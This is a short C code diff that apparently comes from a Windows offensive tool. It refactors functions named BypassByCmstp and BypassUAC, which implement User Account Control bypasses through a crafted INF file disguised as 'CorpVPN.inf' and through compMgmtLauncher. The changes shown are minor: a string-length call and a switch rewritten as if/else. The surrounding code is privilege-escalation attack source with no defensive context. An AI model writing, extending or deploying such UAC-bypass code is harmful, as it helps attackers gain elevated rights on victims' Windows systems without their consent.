@@ -71,7 +71,7 @@ VOID BypassByCmstp
 	CHAR szInfData[0x1000];
 	StringCbPrintfA(szInfData, _countof(szInfData), szFormat, lpCommand);
 	lpTempFile = GenerateTempPathW(L"CorpVPN.inf", NULL, NULL);
-	if (!WriteToFile(lpTempFile, szInfData, strlen(szInfData))) {
+	if (!WriteToFile(lpTempFile, szInfData, lstrlenA(szInfData))) {
 		goto END;
 	}
 
@@ -98,15 +98,10 @@ VOID BypassUAC
 	_In_ LPSTR lpCommand
 )
 {
-	switch (Type)
-	{
-	case Cmstp:
+	if (Type == Cmstp) {
 		BypassByCmstp(lpCommand);
-		break;
-	case compMgmtLauncher:
+	}
+	else if (Type == compMgmtLauncher) {
 		BypassBycomMgmtLauncher(lpCommand);
-		break;
-	default:
-		break;
 	}
 }
